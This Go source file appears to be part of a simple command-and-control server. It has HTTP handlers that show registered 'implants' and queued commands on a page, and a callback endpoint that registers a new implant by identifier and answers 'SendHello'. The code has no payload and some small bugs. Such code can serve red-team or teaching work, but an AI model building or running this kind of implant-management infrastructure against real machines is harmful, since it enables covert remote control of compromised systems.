package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"
)

var index_template = template.Must(template.ParseFiles("templates/index.html"))

func getImplantHandler(w http.ResponseWriter, r *http.Request) {
	implants, err := store.GetImplants()
	commands, err := store.GetCommands()

	log.Println(implants)
	log.Println(commands)
	err = index_template.Execute(w, struct {
		ImplantList []*Implant
		CommandList []*Command
	}{implants, commands})

	if err != nil {
		fmt.Println(fmt.Errorf("Error: %v", err))
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	//implantListBytes, err := json.Marshal(implants)

	if err != nil {
		fmt.Println(fmt.Errorf("Error: %v", err))
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	//w.Write(implantListBytes)

}

func callbackHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		keys, ok := r.URL.Query()["id"]

		if !ok || len(keys[0]) < 1 {
			log.Println("No identifier")
			return
		}
		key := keys[0]
		newCB, err := store.doesImplantExist(key)

		if err != nil {
			log.Println("Couldn't check the existence %s", err)
			return
		}
		log.Println(newCB)

		if newCB == true {
			implant := Implant{}
			implant.Identifier = key
			implant.Ipaddress = ""
			err := store.CreateImplant(&implant)

			if err != nil {
				log.Println("Couldnt create implant: ", err)
				return
			}

			w.Header().Set("Content-Type", "text/html; charset-utf8")
			fmt.Fprint(w, "SendHello")
		}
	}
}
